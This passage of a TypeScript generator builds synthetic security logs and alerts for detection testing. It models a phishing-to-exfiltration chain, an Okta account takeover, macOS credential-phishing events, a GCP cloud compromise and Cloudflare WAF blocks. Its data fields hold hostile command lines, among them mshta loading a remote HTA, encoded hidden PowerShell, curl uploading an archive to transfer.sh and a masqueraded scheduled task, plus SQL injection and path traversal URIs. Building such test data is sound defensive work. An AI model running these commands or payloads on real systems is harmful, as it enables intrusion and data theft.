    extra: { host, user, process: { entity_id: "cs-mshta-003", name: "mshta.exe", pid: 5200, parent: { name: "chrome.exe" } }, agent: { type: "filebeat" } },
  }));

  docs.push(alert(minutesAgo(count - 5), {
    ruleName: "CrowdStrike - Encoded PowerShell Execution", dataset: "crowdstrike.fdr",
    severity: "high", riskScore: 80,
    reason: "Hidden PowerShell with Base64-encoded command spawned by mshta.exe on LAPTOP-SALES04",
    threat: [mitre("TA0002", "Execution", "T1059.001", "PowerShell")],
    extra: { host, user, process: { entity_id: "cs-ps-004", name: "powershell.exe", pid: 5300 }, agent: { type: "filebeat" } },
  }));

  docs.push(alert(minutesAgo(count - 7), {
    ruleName: "CrowdStrike - Certutil Used for File Download", dataset: "crowdstrike.fdr",
    severity: "high", riskScore: 75,
    reason: `certutil.exe used to download beacon from ${c2Ip} to C:\\ProgramData\\svchost.exe`,
    threat: [mitre("TA0011", "Command and Control", "T1105", "Ingress Tool Transfer")],
    extra: { host, user, process: { entity_id: "cs-certutil-008", name: "certutil.exe", pid: 5700 }, agent: { type: "filebeat" } },
  }));

  docs.push(alert(minutesAgo(5), {
    ruleName: "CrowdStrike - Masqueraded Process Name", dataset: "crowdstrike.fdr",
    severity: "critical", riskScore: 92,
    reason: "svchost.exe running from C:\\ProgramData\\ — masqueraded malware beacon",
    threat: [mitre("TA0005", "Defense Evasion", "T1036.005", "Match Legitimate Name or Location")],
    extra: { host, user, process: { entity_id: "cs-beacon-009", name: "svchost.exe", pid: 5800, executable: "C:\\ProgramData\\svchost.exe" }, agent: { type: "filebeat" } },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "CrowdStrike - WMI Remote Process Execution", dataset: "crowdstrike.fdr",
    severity: "high", riskScore: 82,
    reason: "wmic.exe spawned by beacon process for lateral movement from LAPTOP-SALES04",
    threat: [mitre("TA0008", "Lateral Movement", "T1047", "Windows Management Instrumentation")],
    extra: { host, user, process: { entity_id: "cs-wmi-010", name: "wmic.exe", pid: 5900 }, agent: { type: "filebeat" } },
  }));

  return docs;
}

// --- CDR Cross-Domain Compromise (CrowdStrike + Okta, shared user/IP) ---

function generateCdrCrossDomain(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const sharedUser = { email: "alex.chen@acmecorp.com", name: "alex.chen", full_name: "Alex Chen" };
  const legitimateIp = "203.0.113.25";
  const attackerIp = randomIp();
  const exfilUrl = "https://transfer.sh/uploads";
  const host = getCrowdstrikeHost();

  const E = {
    explorer: "cdr-explorer-0001", chrome: "cdr-chrome-0002", mshta: "cdr-mshta-0003",
    ps: "cdr-ps-0004", netEnum: "cdr-net-0005", sevenZ: "cdr-7z-0006",
    curl: "cdr-curl-0007", schtasks: "cdr-schtasks-0008",
  };

  const csChain = [
    { eid: E.explorer, parentEid: "", name: "explorer.exe", pid: 4000, exe: "C:\\Windows\\explorer.exe" },
    { eid: E.chrome, parentEid: E.explorer, name: "chrome.exe", pid: 5100, exe: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", args: ["--type=renderer"], parentName: "explorer.exe", parentPid: 4000 },
    { eid: E.mshta, parentEid: E.chrome, name: "mshta.exe", pid: 5200, exe: "C:\\Windows\\System32\\mshta.exe", args: ["http://phish.example.com/stage1.hta"], parentName: "chrome.exe", parentPid: 5100 },
    { eid: E.ps, parentEid: E.mshta, name: "powershell.exe", pid: 5300, exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", args: ["-NoP", "-W", "Hidden", "-enc", "SQBFAFgA"], parentName: "mshta.exe", parentPid: 5200 },
    { eid: E.netEnum, parentEid: E.ps, name: "net.exe", pid: 5400, exe: "C:\\Windows\\System32\\net.exe", args: ["user", "/domain"], parentName: "powershell.exe", parentPid: 5300 },
    { eid: E.sevenZ, parentEid: E.ps, name: "7z.exe", pid: 5500, exe: "C:\\Program Files\\7-Zip\\7z.exe", args: ["a", "C:\\Temp\\finance_data.7z", "C:\\Shares\\Finance\\*"], parentName: "powershell.exe", parentPid: 5300 },
    { eid: E.curl, parentEid: E.ps, name: "curl.exe", pid: 5600, exe: "C:\\Windows\\System32\\curl.exe", args: ["--upload-file", "C:\\Temp\\finance_data.7z", exfilUrl], parentName: "powershell.exe", parentPid: 5300 },
    { eid: E.schtasks, parentEid: E.ps, name: "schtasks.exe", pid: 5700, exe: "C:\\Windows\\System32\\schtasks.exe", args: ["/create", "/sc", "daily", "/tn", "WindowsUpdate", "/tr", "C:\\ProgramData\\update.exe"], parentName: "powershell.exe", parentPid: 5300 },
  ];

  // Emit full CS process tree with shared user.email
  for (let i = 0; i < csChain.length; i++) {
    const node = csChain[i];
    docs.push({
      _index: "logs-crowdstrike.fdr-default",
      _source: {
        ...baseEvent(minutesAgo(count - i)),
        agent: { type: "filebeat", id: AGENT_ID },
        event: { action: "ProcessRollup2", category: ["process"], type: ["start"], kind: "event", dataset: "crowdstrike.fdr", module: "crowdstrike" },
        host, user: { name: sharedUser.name, email: sharedUser.email, domain: "ACME" },
        related: { user: [sharedUser.name, sharedUser.email], ip: [attackerIp] },
        process: {
          entity_id: node.eid, parent: { entity_id: node.parentEid || undefined, name: node.parentName, pid: node.parentPid },
          name: node.name, pid: node.pid, executable: node.exe, args: node.args, command_line: [node.exe, ...(node.args || [])].join(" "),
        },
      },
    });
  }

  // Extra CS discovery events
  const enumCmds = [{ name: "whoami.exe", args: ["/all"] }, { name: "ipconfig.exe", args: ["/all"] }, { name: "nltest.exe", args: ["/dclist:acme.local"] }, { name: "tasklist.exe", args: ["/v"] }];
  for (let i = csChain.length; i < Math.ceil(count * 0.4); i++) {
    const cmd = enumCmds[i % enumCmds.length];
    docs.push({
      _index: "logs-crowdstrike.fdr-default",
      _source: {
        ...baseEvent(minutesAgo(count - i)),
        agent: { type: "filebeat", id: AGENT_ID },
        event: { action: "ProcessRollup2", category: ["process"], type: ["start"], kind: "event", dataset: "crowdstrike.fdr" },
        host, user: { name: sharedUser.name, email: sharedUser.email },
        related: { user: [sharedUser.name, sharedUser.email] },
        process: { entity_id: entityId("cdr-enum", i), parent: { entity_id: E.ps, name: "powershell.exe", pid: 5300 }, name: cmd.name, pid: 5800 + i, executable: `C:\\Windows\\System32\\${cmd.name}`, args: cmd.args },
      },
    });
  }

  // CS network events (exfil traffic from curl)
  for (let i = 0; i < 4; i++) {
    docs.push({
      _index: "logs-crowdstrike.fdr-default",
      _source: {
        ...baseEvent(minutesAgo(7 - i)),
        agent: { type: "filebeat", id: AGENT_ID },
        event: { action: "NetworkConnectIP4", category: ["network"], type: ["connection"], kind: "event", dataset: "crowdstrike.fdr" },
        host, user: { name: sharedUser.name, email: sharedUser.email },
        source: { ip: "10.0.3.50", port: 49000 + i }, destination: { ip: attackerIp, port: 443 },
        process: { entity_id: E.curl, name: "curl.exe", pid: 5600 },
        related: { ip: [attackerIp, "10.0.3.50"], user: [sharedUser.name, sharedUser.email] },
      },
    });
  }

  // --- Okta events for the SAME user, SAME attacker IP ---
  const oktaTimeline = [
    { action: "user.session.start", cat: "authentication", ip: legitimateIp, city: "San Francisco", country: "US", outcome: "SUCCESS", mb: count },
    { action: "user.session.start", cat: "authentication", ip: attackerIp, city: "Bucharest", country: "RO", outcome: "SUCCESS", mb: 18 },
    { action: "user.mfa.factor.deactivate", cat: "iam", ip: attackerIp, city: "Bucharest", country: "RO", outcome: "SUCCESS", mb: 16 },
    { action: "user.account.update_password", cat: "iam", ip: attackerIp, city: "Bucharest", country: "RO", outcome: "SUCCESS", mb: 12 },
    { action: "app.user_membership.add", cat: "iam", ip: attackerIp, city: "Bucharest", country: "RO", outcome: "SUCCESS", mb: 8 },
    { action: "system.api_token.create", cat: "iam", ip: attackerIp, city: "Bucharest", country: "RO", outcome: "SUCCESS", mb: 4 },
  ];

  for (const s of oktaTimeline) {
    docs.push({
      _index: "logs-okta.system-default",
      _source: {
        ...baseEvent(minutesAgo(s.mb)),
        event: { action: s.action, category: [s.cat], outcome: s.outcome.toLowerCase(), kind: "event", dataset: "okta.system", module: "okta" },
        user: { name: sharedUser.email, email: sharedUser.email, full_name: sharedUser.full_name },
        source: { ip: s.ip },
        related: { user: [sharedUser.name, sharedUser.email], ip: [s.ip] },
        okta: {
          actor: { alternate_id: sharedUser.email, display_name: sharedUser.full_name },
          outcome: { result: s.outcome },
          client: { ip_address: s.ip, user_agent: { raw_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }, geographical_context: { country: s.country, city: s.city } },
        },
      },
    });
  }

  // Extra Okta events for count
  const oktaExtra = ["user.session.start", "user.authentication.auth_via_mfa", "policy.evaluate_sign_on"];
  for (let i = oktaTimeline.length; i < Math.ceil(count * 0.4); i++) {
    docs.push({
      _index: "logs-okta.system-default",
      _source: {
        ...baseEvent(minutesAgo(count - i)),
        event: { action: oktaExtra[i % oktaExtra.length], category: ["authentication"], outcome: "success", kind: "event", dataset: "okta.system" },
        user: { name: sharedUser.email, email: sharedUser.email },
        source: { ip: i % 3 === 0 ? attackerIp : legitimateIp },
        related: { user: [sharedUser.name, sharedUser.email] },
        okta: { actor: { alternate_id: sharedUser.email, display_name: sharedUser.full_name }, outcome: { result: "SUCCESS" }, client: { ip_address: i % 3 === 0 ? attackerIp : legitimateIp, geographical_context: { country: i % 3 === 0 ? "RO" : "US" } } },
      },
    });
  }

  // --- CrowdStrike Alerts (5) with process tree ---
  const csAnc = [E.ps, E.mshta, E.chrome, E.explorer];

  docs.push(alert(minutesAgo(25), {
    ruleName: "CDR - MSHTA Spawned by Browser", dataset: "crowdstrike.fdr", severity: "high", riskScore: 78,
    reason: `chrome.exe spawned mshta.exe on LAPTOP-FIN03 — user ${sharedUser.email}`,
    threat: [mitre("TA0002", "Execution", "T1218.005", "Mshta")],
    host, user: { name: sharedUser.name, email: sharedUser.email }, agentType: "filebeat",
    process: { entityId: E.mshta, parentEntityId: E.chrome, ancestry: [E.chrome, E.explorer], name: "mshta.exe", pid: 5200, executable: "C:\\Windows\\System32\\mshta.exe", parentName: "chrome.exe", parentPid: 5100 },
  }));

  docs.push(alert(minutesAgo(22), {
    ruleName: "CDR - Encoded PowerShell from Phishing Chain", dataset: "crowdstrike.fdr", severity: "high", riskScore: 80,
    reason: `Hidden encoded PowerShell spawned by mshta.exe on LAPTOP-FIN03 — ${sharedUser.email}`,
    threat: [mitre("TA0002", "Execution", "T1059.001", "PowerShell")],
    host, user: { name: sharedUser.name, email: sharedUser.email }, agentType: "filebeat",
    process: { entityId: E.ps, parentEntityId: E.mshta, ancestry: [E.mshta, E.chrome, E.explorer], name: "powershell.exe", pid: 5300, parentName: "mshta.exe", parentPid: 5200 },
  }));

  docs.push(alert(minutesAgo(10), {
    ruleName: "CDR - Data Staging via Archive Tool", dataset: "crowdstrike.fdr", severity: "high", riskScore: 75,
    reason: `7z.exe compressing C:\\Shares\\Finance on LAPTOP-FIN03 — ${sharedUser.email}`,
    threat: [mitre("TA0009", "Collection", "T1560.001", "Archive via Utility")],
    host, user: { name: sharedUser.name, email: sharedUser.email }, agentType: "filebeat",
    process: { entityId: E.sevenZ, parentEntityId: E.ps, ancestry: csAnc, name: "7z.exe", pid: 5500, parentName: "powershell.exe", parentPid: 5300 },
  }));

  docs.push(alert(minutesAgo(6), {
    ruleName: "CDR - Data Exfiltration via Curl", dataset: "crowdstrike.fdr", severity: "critical", riskScore: 92,
    reason: `curl.exe uploading finance_data.7z to ${exfilUrl} from LAPTOP-FIN03 — ${sharedUser.email}`,
    threat: [mitre("TA0010", "Exfiltration", "T1048.003", "Exfiltration Over Unencrypted Non-C2 Protocol")],
    host, user: { name: sharedUser.name, email: sharedUser.email }, agentType: "filebeat",
    process: { entityId: E.curl, parentEntityId: E.ps, ancestry: csAnc, name: "curl.exe", pid: 5600, parentName: "powershell.exe", parentPid: 5300 },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "CDR - Scheduled Task Persistence", dataset: "crowdstrike.fdr", severity: "high", riskScore: 72,
    reason: `schtasks.exe creating daily persistence on LAPTOP-FIN03 — ${sharedUser.email}`,
    threat: [mitre("TA0003", "Persistence", "T1053.005", "Scheduled Task")],
    host, user: { name: sharedUser.name, email: sharedUser.email }, agentType: "filebeat",
    process: { entityId: E.schtasks, parentEntityId: E.ps, ancestry: csAnc, name: "schtasks.exe", pid: 5700, parentName: "powershell.exe", parentPid: 5300 },
  }));

  // --- Okta Alerts (5) with shared user.email ---

  docs.push(alert(minutesAgo(18), {
    ruleName: "CDR - Impossible Travel Login", dataset: "okta.system", severity: "medium", riskScore: 55,
    reason: `${sharedUser.email} logged in from Bucharest, RO (${attackerIp}) — 7 min after San Francisco session`,
    threat: [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")],
    user: { name: sharedUser.email, email: sharedUser.email },
    extra: { source: { ip: attackerIp }, related: { user: [sharedUser.name, sharedUser.email], ip: [attackerIp] } },
  }));

  docs.push(alert(minutesAgo(16), {
    ruleName: "CDR - MFA Deactivated After Suspicious Login", dataset: "okta.system", severity: "high", riskScore: 82,
    reason: `MFA factor deactivated for ${sharedUser.email} from ${attackerIp} — 2 min after impossible travel`,
    threat: [mitre("TA0006", "Credential Access", "T1556", "Modify Authentication Process")],
    user: { name: sharedUser.email, email: sharedUser.email },
    extra: { source: { ip: attackerIp }, related: { user: [sharedUser.name, sharedUser.email], ip: [attackerIp] } },
  }));

  docs.push(alert(minutesAgo(12), {
    ruleName: "CDR - Password Changed from Suspicious IP", dataset: "okta.system", severity: "high", riskScore: 78,
    reason: `Password changed for ${sharedUser.email} from ${attackerIp} — identity takeover in progress`,
    threat: [mitre("TA0003", "Persistence", "T1098", "Account Manipulation")],
    user: { name: sharedUser.email, email: sharedUser.email },
    extra: { source: { ip: attackerIp }, related: { user: [sharedUser.name, sharedUser.email], ip: [attackerIp] } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "CDR - User Added to Admin Group", dataset: "okta.system", severity: "critical", riskScore: 90,
    reason: `${sharedUser.email} added to IT-Admins group from ${attackerIp} — privilege escalation`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1098", "Account Manipulation")],
    user: { name: sharedUser.email, email: sharedUser.email },
    extra: { source: { ip: attackerIp }, related: { user: [sharedUser.name, sharedUser.email], ip: [attackerIp] } },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "CDR - API Token Created by Compromised Account", dataset: "okta.system", severity: "critical", riskScore: 88,
    reason: `API token created by ${sharedUser.email} from ${attackerIp} — persistent Okta access`,
    threat: [mitre("TA0003", "Persistence", "T1136.003", "Cloud Account")],
    user: { name: sharedUser.email, email: sharedUser.email },
    extra: { source: { ip: attackerIp }, related: { user: [sharedUser.name, sharedUser.email], ip: [attackerIp] } },
  }));

  return docs;
}

// --- Mac Unified Log Activity (com.apple.TCC, com.apple.appleevents, loginwindow) ---

function generateMacEndpointActivity(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const host = { name: "MACBOOK-DEV07", os: { name: "macOS 15.2", platform: "darwin", type: "macos", family: "darwin" } };
  const bootUuid = "B7E4F2A1-9C3D-4F8E-A1B2-3C4D5E6F7A8B";

  function unifiedLog(ts: string, entry: {
    subsystem: string; category: string; messageType: string;
    processName: string; processExe: string; pid: number; threadId: number;
    senderPath: string; userId: string;
    message: string; formatString?: string; eventType?: string;
    appleEvent?: Record<string, unknown>;
  }): IndexedDoc {
    const eventCategory = entry.subsystem === "com.apple.TCC" ? ["configuration"] :
      entry.subsystem === "com.apple.appleevents" ? ["process"] :
      entry.subsystem === "com.apple.loginwindow.logging" ? ["session"] : ["host"];
    const eventType = entry.subsystem === "com.apple.TCC" ? ["access"] :
      entry.subsystem === "com.apple.appleevents" ? ["info"] : ["start"];

    const src: Record<string, unknown> = {
      ...baseEvent(ts),
      event: { dataset: "unifiedlogs.log", module: "unifiedlogs", kind: "event", category: eventCategory, type: eventType, provider: entry.subsystem },
      host,
      process: { name: entry.processName, executable: entry.processExe, pid: entry.pid, thread: { id: entry.threadId } },
      dll: { path: entry.senderPath, name: entry.senderPath.split("/").pop() },
      user: { id: entry.userId },
      log: { level: entry.messageType.toLowerCase() },
      message: entry.message,
      unified_log: {
        subsystem: entry.subsystem,
        category: entry.category,
        event_type: entry.eventType || "logEvent",
        format_string: entry.formatString || entry.message,
        boot_uuid: bootUuid,
        message_type: entry.messageType,
        activity_id: Math.floor(Math.random() * 900000) + 100000,
      },
    };
    if (entry.appleEvent) src.apple_event = entry.appleEvent;
    return { _index: "logs-unifiedlogs.log-default", _source: src };
  }

  const logEntries = [
    // Apple Event: osascript display dialog (credential phishing)
    { subsystem: "com.apple.appleevents", category: "events", messageType: "Debug", processName: "osascript", processExe: "/usr/bin/osascript", pid: 3300, threadId: 771,
      senderPath: "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/AE.framework/Versions/A/AE", userId: "501",
      message: 'event={syso,dlog} target=\'psn:[ 0x0, 304304 "osascript"]\' params=[prmp, htxt, dtxt, givu] returnID=1',
      appleEvent: { type_code: "syso,dlog", direction: "self", parameters: ["prmp", "htxt", "dtxt", "givu"], target_process: "osascript", return_id: "1", decoded_payloads: ["System Update R", "Enter your pass"] } },
    // Apple Event: set volume mute (stealer pre-indicator)
    { subsystem: "com.apple.appleevents", category: "events", messageType: "Debug", processName: "osascript", processExe: "/usr/bin/osascript", pid: 3301, threadId: 772,
      senderPath: "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/AE.framework/Versions/A/AE", userId: "501",
      message: 'event={aevt,stvl} target=\'psn:[ 0x0, 304304 "osascript"]\' mute=true',
      appleEvent: { type_code: "aevt,stvl", direction: "self", mute: true, parameters: ["mute"], target_process: "osascript" } },
    // Apple Event: get clipboard (data collection)
    { subsystem: "com.apple.appleevents", category: "events", messageType: "Debug", processName: "osascript", processExe: "/usr/bin/osascript", pid: 3302, threadId: 773,
      senderPath: "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/AE.framework/Versions/A/AE", userId: "501",
      message: 'event={Jons,gClp} target=\'psn:[ 0x0, 304304 "osascript"]\' returnID=3',
      appleEvent: { type_code: "Jons,gClp", direction: "self", parameters: [], target_process: "osascript", return_id: "3" } },
    // Apple Event reply (dialog result with password)
    { subsystem: "com.apple.appleevents", category: "events", messageType: "Debug", processName: "osascript", processExe: "/usr/bin/osascript", pid: 3300, threadId: 771,
      senderPath: "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/AE.framework/Versions/A/AE", userId: "501",
      message: 'reply={syso,dlog} returnID=1 params=[utxt, bhit]',
      appleEvent: { type_code: "syso,dlog", direction: "reply", parameters: ["utxt", "bhit"], return_id: "1", decoded_payloads: ["MyP@ssw0rd123!"] } },
    // TCC: Access request for Accessibility
    { subsystem: "com.apple.TCC", category: "access", messageType: "Default", processName: "tccd", processExe: "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", pid: 412, threadId: 202,
      senderPath: "/System/Library/PrivateFrameworks/TCC.framework/Versions/A/TCC", userId: "0",
      message: 'AUTHREQ_CTX: msgID=4012, function=TCCAccessRequest, service=kTCCServiceAccessibility, preflight=0, caller_path=/usr/bin/osascript, caller_pid=3300' },
    // TCC: Access denied for Screen Recording
    { subsystem: "com.apple.TCC", category: "access", messageType: "Default", processName: "tccd", processExe: "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", pid: 412, threadId: 203,
      senderPath: "/System/Library/PrivateFrameworks/TCC.framework/Versions/A/TCC", userId: "0",
      message: 'Denied: service=kTCCServiceScreenCapture, caller_path=/tmp/.update, caller_pid=3200, require_purpose=true' },
    // TCC: publishAccessChangedEvent (privacy state changed)
    { subsystem: "com.apple.TCC", category: "access", messageType: "Default", processName: "tccd", processExe: "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", pid: 412, threadId: 204,
      senderPath: "/System/Library/PrivateFrameworks/TCC.framework/Versions/A/TCC", userId: "0",
      message: 'publishAccessChangedEvent: service=kTCCServiceAccessibility, client=/usr/bin/osascript, allowed=1, auth_reason=user' },
    // loginwindow: LaunchAgent autolaunch
    { subsystem: "com.apple.loginwindow.logging", category: "default", messageType: "Default", processName: "loginwindow", processExe: "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow", pid: 101, threadId: 55,
      senderPath: "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow", userId: "0",
      message: 'performAutolaunch: launching agent com.apple.update at path /Users/j.developer/Library/LaunchAgents/com.apple.update.plist for uid 501' },
    // Apple Event: remote process send (lateral scripting)
    { subsystem: "com.apple.appleevents", category: "events", messageType: "Debug", processName: "osascript", processExe: "/usr/bin/osascript", pid: 3303, threadId: 774,
      senderPath: "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/AE.framework/Versions/A/AE", userId: "501",
      message: 'event={aevt,odoc} target=\'psn:[ 0x0, 515515 "Finder"]\' returnID=5',
      appleEvent: { type_code: "aevt,odoc", direction: "remote", parameters: ["odoc"], target_process: "Finder", return_id: "5" } },
    // TCC: Full Disk Access request
    { subsystem: "com.apple.TCC", category: "access", messageType: "Default", processName: "tccd", processExe: "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", pid: 412, threadId: 205,
      senderPath: "/System/Library/PrivateFrameworks/TCC.framework/Versions/A/TCC", userId: "0",
      message: 'AUTHREQ_CTX: msgID=4018, function=TCCAccessRequest, service=kTCCServiceSystemPolicyAllFiles, preflight=0, caller_path=/tmp/.update, caller_pid=3200' },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const entry = logEntries[i % logEntries.length];
    docs.push(unifiedLog(ts, entry));
  }

  docs.push(alert(minutesAgo(count - 2), {
    ruleName: "macOS - Apple Event Display Dialog (Credential Phishing)", dataset: "unifiedlogs.log", severity: "high", riskScore: 72,
    reason: "osascript displayed fake password dialog via Apple Event syso,dlog on MACBOOK-DEV07 — credential phishing",
    threat: [mitre("TA0002", "Execution", "T1059.002", "AppleScript")],
    extra: { host, process: { name: "osascript", pid: 3300 }, apple_event: { type_code: "syso,dlog" } },
  }));

  docs.push(alert(minutesAgo(count - 3), {
    ruleName: "macOS - Volume Mute via Apple Event (Stealer Indicator)", dataset: "unifiedlogs.log", severity: "critical", riskScore: 88,
    reason: "osascript muted system volume via Apple Event aevt,stvl on MACBOOK-DEV07 — known stealer pre-indicator",
    threat: [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")],
    extra: { host, process: { name: "osascript", pid: 3301 }, apple_event: { type_code: "aevt,stvl", mute: true } },
  }));

  docs.push(alert(minutesAgo(count - 5), {
    ruleName: "macOS - Apple Event Get Clipboard", dataset: "unifiedlogs.log", severity: "high", riskScore: 80,
    reason: "osascript accessed clipboard via Apple Event Jons,gClp on MACBOOK-DEV07 — data collection",
    threat: [mitre("TA0009", "Collection", "T1115", "Clipboard Data")],
    extra: { host, process: { name: "osascript", pid: 3302 }, apple_event: { type_code: "Jons,gClp" } },
  }));

  docs.push(alert(minutesAgo(6), {
    ruleName: "macOS - TCC Access Denied Then Granted", dataset: "unifiedlogs.log", severity: "critical", riskScore: 90,
    reason: "TCC Accessibility access granted to osascript after request on MACBOOK-DEV07 — privacy bypass",
    threat: [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")],
    extra: { host, unified_log: { subsystem: "com.apple.TCC", category: "access" } },
  }));

  docs.push(alert(minutesAgo(3), {
    ruleName: "macOS - LaunchAgent Autolaunch Registered", dataset: "unifiedlogs.log", severity: "high", riskScore: 78,
    reason: "Suspicious LaunchAgent com.apple.update loaded for uid 501 on MACBOOK-DEV07 — persistence",
    threat: [mitre("TA0003", "Persistence", "T1543.001", "Launch Agent")],
    extra: { host, unified_log: { subsystem: "com.apple.loginwindow.logging" } },
  }));

  return docs;
}

// --- GCP Cloud Audit ---

function generateGcpCloudAudit(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const attackerIp = randomIp();
  const legitimateIp = "35.200.100." + Math.floor(Math.random() * 254);
  const projectId = "acme-prod-293847";
  const saEmail = `compromised-sa@${projectId}.iam.gserviceaccount.com`;
  const userEmail = "devops-intern@acmecorp.com";

  const auditActions = [
    { method: "google.iam.admin.v1.CreateServiceAccountKey", resource: `projects/${projectId}/serviceAccounts/${saEmail}`, sev: "NOTICE" },
    { method: "SetIamPolicy", resource: `projects/${projectId}`, sev: "NOTICE" },
    { method: "google.compute.firewalls.insert", resource: `projects/${projectId}/global/firewalls/allow-all-ssh`, sev: "NOTICE" },
    { method: "google.compute.instances.setMetadata", resource: `projects/${projectId}/zones/us-central1-a/instances/prod-db-01`, sev: "NOTICE" },
    { method: "google.storage.buckets.setIamPermissions", resource: `projects/${projectId}/buckets/acme-customer-data`, sev: "WARNING" },
    { method: "google.storage.objects.list", resource: `projects/${projectId}/buckets/acme-customer-data`, sev: "INFO" },
    { method: "google.storage.objects.get", resource: `projects/${projectId}/buckets/acme-customer-data/objects/exports/customers.csv`, sev: "INFO" },
    { method: "google.logging.v2.ConfigServiceV2.DeleteSink", resource: `projects/${projectId}/sinks/security-audit-sink`, sev: "WARNING" },
    { method: "google.compute.instances.insert", resource: `projects/${projectId}/zones/us-east1-b/instances/crypto-miner-01`, sev: "NOTICE" },
    { method: "google.iam.admin.v1.CreateRole", resource: `projects/${projectId}/roles/superAdmin`, sev: "WARNING" },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const action = auditActions[i % auditActions.length];
    const ip = i < 2 ? legitimateIp : attackerIp;
    docs.push({
      _index: "logs-gcp.audit-default",
      _source: {
        ...baseEvent(ts),
        event: { action: action.method, category: ["configuration"], type: ["change"], kind: "event", dataset: "gcp.audit", module: "gcp", outcome: "success" },
        cloud: { provider: "gcp", project: { id: projectId }, account: { id: projectId } },
        user: { email: i < 2 ? userEmail : saEmail },
        source: { ip },
        gcp: {
          audit: {
            method_name: action.method,
            resource_name: action.resource,
            authentication_info: { principal_email: i < 2 ? userEmail : saEmail },
            authorization_info: { permission: action.method, granted: true },
            status: { code: 0 },
          },
        },
        log: { level: action.sev },
      },
    });
  }

  docs.push(alert(minutesAgo(count - 1), {
    ruleName: "GCP - Service Account Key Created", dataset: "gcp.audit", severity: "high", riskScore: 78,
    reason: `New service account key created for ${saEmail} by ${userEmail}`,
    threat: [mitre("TA0003", "Persistence", "T1098.001", "Additional Cloud Credentials")],
    extra: { cloud: { provider: "gcp", project: { id: projectId } }, user: { email: userEmail }, source: { ip: legitimateIp } },
  }));

  docs.push(alert(minutesAgo(count - 3), {
    ruleName: "GCP - IAM Policy Modified to Allow All Users", dataset: "gcp.audit", severity: "critical", riskScore: 95,
    reason: `IAM policy on ${projectId} modified to grant allUsers access — public exposure`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1078.004", "Cloud Accounts")],
    extra: { cloud: { provider: "gcp", project: { id: projectId } }, user: { email: saEmail }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(count - 5), {
    ruleName: "GCP - Firewall Rule Allows Inbound SSH from Any", dataset: "gcp.audit", severity: "high", riskScore: 80,
    reason: `Firewall rule 'allow-all-ssh' created allowing 0.0.0.0/0 on port 22 in ${projectId}`,
    threat: [mitre("TA0005", "Defense Evasion", "T1562.007", "Disable or Modify Cloud Firewall")],
    extra: { cloud: { provider: "gcp", project: { id: projectId } }, user: { email: saEmail }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "GCP - Cloud Logging Sink Deleted", dataset: "gcp.audit", severity: "critical", riskScore: 92,
    reason: `Security audit log sink deleted in ${projectId} — evidence destruction`,
    threat: [mitre("TA0005", "Defense Evasion", "T1562.008", "Disable or Modify Cloud Logs")],
    extra: { cloud: { provider: "gcp", project: { id: projectId } }, user: { email: saEmail }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "GCP - Cloud Storage Bucket Made Public", dataset: "gcp.audit", severity: "critical", riskScore: 88,
    reason: `Bucket acme-customer-data made public in ${projectId} — data exposure`,
    threat: [mitre("TA0010", "Exfiltration", "T1537", "Transfer Data to Cloud Account")],
    extra: { cloud: { provider: "gcp", project: { id: projectId } }, user: { email: saEmail }, source: { ip: attackerIp } },
  }));

  return docs;
}

// --- Cloudflare WAF & Security Events ---

function generateCloudflareWafThreats(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const targetDomain = "app.acmecorp.com";
  const attackerIps = [randomIp(), randomIp(), randomIp()];
  const legitimateIp = "198.51.100.42";

  const wafEvents = [
    { action: "block", ruleId: "100001", ruleMsg: "SQLi in query parameter", uri: "/api/users?id=1'+OR+1=1--", method: "GET", botScore: 2, category: "sqli" },
    { action: "block", ruleId: "100002", ruleMsg: "XSS in POST body", uri: "/api/comments", method: "POST", botScore: 5, category: "xss" },
    { action: "challenge", ruleId: "100003", ruleMsg: "Credential stuffing on login", uri: "/auth/login", method: "POST", botScore: 1, category: "credential-stuffing" },
    { action: "block", ruleId: "100004", ruleMsg: "Path traversal in URI", uri: "/api/files?path=../../../etc/passwd", method: "GET", botScore: 3, category: "traversal" },
    { action: "drop", ruleId: "100005", ruleMsg: "L7 DDoS flood detected", uri: "/", method: "GET", botScore: 0, category: "ddos" },
    { action: "block", ruleId: "100006", ruleMsg: "Shellshock exploit attempt", uri: "/cgi-bin/status", method: "GET", botScore: 1, category: "rce" },
    { action: "log", ruleId: "100007", ruleMsg: "Suspicious User-Agent string", uri: "/robots.txt", method: "GET", botScore: 12, category: "recon" },
    { action: "challenge", ruleId: "100008", ruleMsg: "Rate limit exceeded on API", uri: "/api/search", method: "GET", botScore: 8, category: "rate-limit" },
